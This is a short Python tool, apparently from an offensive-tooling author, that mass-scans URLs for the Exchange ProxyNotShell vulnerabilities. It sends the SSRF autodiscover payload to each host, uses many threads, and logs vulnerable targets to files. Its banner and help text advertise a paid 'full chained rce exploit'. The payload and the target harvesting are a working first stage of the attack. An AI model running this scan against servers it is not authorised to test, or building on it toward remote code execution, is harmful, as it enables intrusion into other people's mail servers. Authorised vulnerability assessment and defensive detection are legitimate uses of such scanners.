#coded by TRHACKNON


import argparse, sys, requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

banner = """


 _______    _______  __   __  ___  _________     
|   _  "\  /" __   )|"  |/  \|  "|("       "\    
(. |_)  :)(__/ _) ./|'  /    \:  | \___/   :/    
|:     \/     /  // |: /'        |    /   //     
(|  _  \\  __ \_ \\  \//  /\'    |  __\  ./      
|: |_)  :)(: \__) :\ /   /  \\   | (:  \_/ \     
(_______/  \_______)|___/    \___|  \_______)    
                                                 
coded by trhacknon
this is an scanner for ProxyNotShell
for full chained rce exploit visit: https://satoshidisk.com/pay/
"""
print(banner)


class customParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)
parser = customParser(prog='ProxyNotShell detector', description="""Python 3 script to detect the ProxyNotShell (CVE-2022-41082/CVE-2022-41040)


   for full chained rce exploit visit: https://satoshidisk.com/pay/CGZrDu"""
)
parser.add_argument('-u', help='Single URL / File with a list of URLs format(https://127.0.0.1)')
parser.add_argument('-t', '--threads', help='Number of threads', type=int, default=15)
parser.add_argument('-p', '--proxy', help='Send traffic through a proxy (by default, Burp)', nargs='?', default=None, const='http://127.0.0.1:8080')
args = parser.parse_args()

def vuln(url):
    output_name = 'vuln.txt'
    f = open(output_name, 'a')
    f.write(url + '\n')
    f.close()
def pvuln(url):
    output_name = 'potential-vuln.txt'
    f = open(output_name, 'a')
    f.write(url + '\n')
    f.close()
def check(url, urlId):
    try:
        payload = "/autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
        headers = {
            'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
        }
        r = requests.get("{}{}".format(url, payload), headers=headers, verify=False, timeout=30)
#        print(r.headers)
        if r.status_code == 200 and 'Powershell' in r.text:
            print("[+] {} vulnerable to ProxyNotShell.".format(url))
            vuln(url)
        elif r.status_code != 200 and 'X-FEServer' in r.text:
            print('[{}] {} (potential Vulnerable)'.format(urlId, url))
            pvuln(url)
        elif r.status_code == 503:
            print('[{}] {} (Not Vulnerable)'.format(urlId, url))
        else:
            print('[{}] {} (Not even exchange server)'.format(urlId, url))
    except Exception as e:
        print('[-] {} (connection error)'.format(url))
        pass

disable_warnings()
if args.proxy is None:
    proxies = {}
else:
    proxies = {'http':args.proxy, 'https':args.proxy}
urlId = 0
try:
    with open(args.u) as urlFile:
        urlList = (line.strip() for line in urlFile)
        urlList = list(line for line in urlList if line)
        urlList = list(dict.fromkeys(urlList))
        urlLength = len(urlList)
        if urlLength > 1:
            print('[!] {} URLs loaded'.format(urlLength))
except:
    urlList = [args.u]
with ThreadPoolExecutor(max_workers=args.threads) as executor:
    for url in urlList:
        urlId += 1
        executor.submit(check, url, urlId)
